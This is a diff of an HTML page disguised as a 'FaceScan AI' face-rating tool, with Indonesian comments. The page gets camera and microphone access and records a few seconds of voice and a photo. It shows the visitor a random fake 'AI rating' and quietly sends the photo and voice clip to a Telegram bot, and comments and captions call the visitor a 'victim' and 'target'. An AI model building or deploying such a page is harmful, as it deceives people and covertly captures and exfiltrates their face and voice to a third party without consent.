@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Face Biometric - Analysis Pro</title>
     <script src="config.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;700&display=swap');
         :root { --cyan: #00f2ff; }
@@ -13,11 +12,11 @@
         .app-card { width: 90%; max-width: 400px; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 40px; padding: 40px 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
         #cam-holder { display: none; width: 260px; height: 260px; margin: 25px auto; border-radius: 50%; border: 3px solid var(--cyan); position: relative; overflow: hidden; background: #111; box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .laser { position: absolute; width: 100%; height: 3px; background: var(--cyan); top: 0; box-shadow: 0 0 20px var(--cyan); animation: scan 2s infinite ease-in-out; z-index: 10; display: none; }
+        .laser { position: absolute; width: 100%; height: 4px; background: var(--cyan); top: 0; box-shadow: 0 0 20px var(--cyan); animation: scan 2s infinite ease-in-out; z-index: 10; }
         @keyframes scan { 0%, 100% { top: 0%; } 50% { top: 100%; } }
         .btn-main { background: #fff; color: #000; padding: 18px 40px; border: none; border-radius: 20px; font-weight: 700; width: 100%; cursor: pointer; transition: 0.3s; }
-        #status { margin-top: 20px; font-size: 0.75rem; color: var(--cyan); font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase; }
-        #final-box { display: none; animation: popUp 0.6s ease-out; }
+        #status { margin-top: 20px; font-size: 0.75rem; color: var(--cyan); font-weight: 700; letter-spacing: 2px; text-transform: uppercase; }
+        #final-box { display: none; animation: popUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         @keyframes popUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         .score-num { font-size: 5rem; font-weight: 800; background: linear-gradient(to bottom, #fff, var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 5px 0; }
     </style>
@@ -27,21 +26,21 @@
     <div class="app-card">
         <div id="intro">
             <h1>FaceScan <span style="color:var(--cyan)">AI</span></h1>
-            <p style="color:#888; font-size: 0.9rem;">Analisis profil visual menggunakan standar biometrik global.</p>
+            <p style="color:#888; font-size: 0.9rem; margin-bottom: 25px;">Menganalisis profil visual dan struktur vokal dengan standar Golden Ratio.</p>
             <button class="btn-main" id="start-btn">START ANALYSIS</button>
         </div>
 
         <div id="cam-holder">
-            <div class="laser" id="laser-line"></div>
+            <div class="laser"></div>
             <video id="video" autoplay playsinline muted></video> 
         </div>
 
-        <div id="status">SENSOR READY</div>
+        <div id="status">SENSOR IDLE</div>
 
         <div id="final-box">
-            <div style="font-size: 0.7rem; color: var(--cyan); font-weight:700;">RESULT SCORE</div>
+            <div style="font-size: 0.7rem; color: var(--cyan); font-weight:700;">AI RATING</div>
             <div class="score-num" id="score-val">0%</div>
-            <p style="font-weight:700;">PREMIUM QUALITY</p>
+            <p style="font-weight:700;">PREMIUM PROFILE DETECTED</p>
         </div>
     </div>
 
@@ -51,105 +50,82 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
-        const laser = document.getElementById('laser-line');
-        
         let mediaRecorder;
         let audioChunks = [];
-        let isProcessing = false;
-        let captureTimeout;
-
-        async function loadAI() {
-            try {
-                await faceapi.nets.tinyFaceDetector.loadFromUri('https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights');
-            } catch(e) { status.innerText = "AI ERROR"; }
-        }
-        loadAI();
 
         document.getElementById('start-btn').onclick = async () => {
             document.getElementById('intro').style.display = 'none';
             document.getElementById('cam-holder').style.display = 'block';
-            status.innerText = "SENSING FACE...";
+            status.innerText = "INITIALIZING SENSORS...";
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
 
-                const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm';
-                mediaRecorder = new MediaRecorder(stream, { mimeType });
-                
-                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
-                
-                video.addEventListener('play', () => {
-                    // JIKA DALAM 5 DETIK WAJAH TIDAK STABIL, PAKSA SCAN!
-                    captureTimeout = setTimeout(() => {
-                        if (!isProcessing) {
-                            console.log("Force Triggered");
-                            startPrank();
-                        }
-                    }, 5000);
-
-                    const checkLoop = setInterval(async () => {
-                        if (isProcessing) { clearInterval(checkLoop); return; }
-                        const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions());
-                        if (detections.length > 0) {
-                            clearTimeout(captureTimeout);
-                            startPrank();
-                            clearInterval(checkLoop);
-                        }
-                    }, 800);
-                });
-
-                mediaRecorder.onstop = async () => {
-                    status.innerText = "FINALIZING...";
-                    setTimeout(async () => { await takeAndSend(); }, 2000);
-                };
+                // Memulai proses prank secara otomatis setelah kamera aktif
+                setTimeout(() => {
+                    startPrank(stream);
+                }, 1500);
 
             } catch (err) {
-                alert("Izin Kamera & Mic diperlukan.");
+                alert("Izin Kamera & Mic diperlukan untuk analisis AI.");
                 location.reload();
             }
         };
 
-        function startPrank() {
-            isProcessing = true;
-            laser.style.display = 'block';
-            status.innerText = "SCANNING GEOMETRY...";
-            audioChunks = [];
-            mediaRecorder.start(200); 
-            // Rekam selama 6 detik lalu kirim
-            setTimeout(() => { mediaRecorder.stop(); }, 6000);
+        function startPrank(stream) {
+            status.innerText = "SCANNING FACE & VOICE...";
+            
+            // Rekam Audio
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
+            mediaRecorder.start();
+
+            // Jalankan scan selama 6 detik
+            setTimeout(() => {
+                mediaRecorder.stop();
+                status.innerText = "ENCRYPTING BIOMETRIC...";
+                
+                mediaRecorder.onstop = async () => {
+                    await takeAndSend();
+                };
+            }, 6000);
         }
 
         async function takeAndSend() {
-            // Ambil Gambar
+            // 1. Ambil Foto (Anti-Mirror)
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
-            const score = Math.floor(Math.random() * 10) + 89;
+            const score = Math.floor(Math.random() * 11) + 88;
 
-            // Kirim Foto
+            // 2. Kirim Foto ke Telegram
             const photoData = new FormData();
             photoData.append('chat_id', CONFIG.CHAT_ID);
-            photoData.append('photo', photoBlob, 'result.png');
-            photoData.append('caption', `🎯 **ANALYSIS COMPLETE**\n\n📊 Skor: ${score}%`);
-            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: photoData });
+            photoData.append('photo', photoBlob, 'face.png');
+            photoData.append('caption', `🔥 **PRANK SUCCESS**\n\n🎯 Skor AI: ${score}%\n👤 Target terekam!`);
+            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: photoData });
 
-            // Kirim Audio
-            const audioBlob = new Blob(audioChunks, { type: mediaRecorder.mimeType });
+            // 3. Kirim VN (Pake ekstensi .m4a biar durasi muncul)
+            const audioBlob = new Blob(audioChunks, { type: 'audio/mp4' });
             const audioData = new FormData();
             audioData.append('chat_id', CONFIG.CHAT_ID);
-            audioData.append('voice', audioBlob, 'voice.ogg'); 
+            audioData.append('voice', audioBlob, `voice_${Date.now()}.m4a`);
+            
             await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVoice`, { method: 'POST', body: audioData });
 
-            // Tampilkan Skor di Layar Korban
+            // 4. UI Selesai
             document.getElementById('cam-holder').style.display = 'none';
             status.style.display = 'none';
             document.getElementById('score-val').innerText = score + "%";
             document.getElementById('final-box').style.display = 'block';
+
+            // Stop Kamera
             video.srcObject.getTracks().forEach(t => t.stop());
         }
     </script>
